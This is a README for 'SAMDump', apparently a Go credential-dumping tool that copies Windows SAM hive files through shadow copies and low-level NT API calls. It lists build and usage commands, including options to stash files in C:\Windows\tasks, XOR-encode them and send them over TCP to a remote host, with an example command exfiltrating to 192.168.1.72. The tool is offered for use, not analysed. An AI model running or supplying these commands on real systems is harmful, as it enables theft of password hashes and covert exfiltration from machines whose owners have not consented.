# SAMDump — Golang

Go implementation using raw COM vtable calls for VSS and NT API (`NtCreateFile`, `NtReadFile`, `NtWriteFile`) for file operations.

## Requirements

- [Go](https://go.dev/) compiler (Windows)
- Administrator privileges

## Compilation

```
go build -o samdump.exe -ldflags="-s -w" samdump.go
```

## Usage

```
samdump.exe [OPTIONS]

Options:
  --save-local           Save files locally
  --output-dir <path>    Output directory (default: C:\Windows\tasks)
  --send-remote          Send files over TCP
  --host <ip>            Remote host (default: 127.0.0.1)
  --port <port>          Remote port (default: 7777)
  --xor-encode           XOR encode before save/send
  --xor-key <key>        XOR key (default: SAMDump2025)
  --disk <vol>           Volume for shadow copy (default: C:\)
  --help                 Show help
```

### Save locally

```
samdump.exe --save-local --output-dir C:\temp
```

### Send to a remote server with XOR encoding

```
samdump.exe --send-remote --host 192.168.1.72 --port 7777 --xor-encode
```
